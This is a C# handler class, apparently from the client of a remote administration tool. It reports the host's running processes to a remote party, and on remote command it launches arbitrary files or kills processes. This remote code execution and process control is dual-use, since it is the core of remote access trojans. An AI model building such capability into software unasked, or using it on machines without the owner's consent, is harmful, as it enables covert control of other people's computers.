using Client.Networking.Packets.TaskManager;
using System.Diagnostics;

namespace Client.Networking.Handlers
{
    public class TaskManagerHandler : IDisposable
    {
        private readonly Client _client;

        public TaskManagerHandler(Client client)
        {
            _client = client;
        }

        public async Task GetProcesses()
        {
            Process[] pList = Process.GetProcesses();
            var processes = new List<Common.Models.Process>();

            for (int i = 0; i < pList.Length; i++)
            {
                var process = new Common.Models.Process
                {
                    Name = pList[i].ProcessName + ".exe",
                    Id = pList[i].Id,
                    MainWindowTitle = pList[i].MainWindowTitle
                };
                processes.Add(process);
            }

            _ = _client.QueuePacketAsync(new GetProcessesPacket { Processes = processes });
        }

        public async Task ActionProcess(ProcessActionPacket packet)
        {
            switch (packet.ProcessAction)
            {
                case Common.Enums.ProcessAction.Start:
                    packet.Result = false;
                    if (!string.IsNullOrEmpty(packet.FilePath))
                    {
                        try
                        {
                            ProcessStartInfo startInfo = new ProcessStartInfo
                            {
                                UseShellExecute = true,
                                FileName = packet.FilePath
                            };
                            Process.Start(startInfo);
                            packet.Result = true;
                        }
                        catch (Exception)
                        {
                            packet.Result = false;
                        }
                    }
                    _ = _client.QueuePacketAsync(packet);
                    break;
                case Common.Enums.ProcessAction.End:
                    packet.Result = false;
                    try
                    {
                        Process.GetProcessById(packet.Pid).Kill();
                        packet.Result = true;
                    }
                    catch
                    {
                        packet.Result = false;
                    }
                    _ = _client.QueuePacketAsync(packet);
                    break;
                default:
                    break;
            }
        }
        public void Dispose()
        {
            GC.SuppressFinalize(this);
        }
    }
}
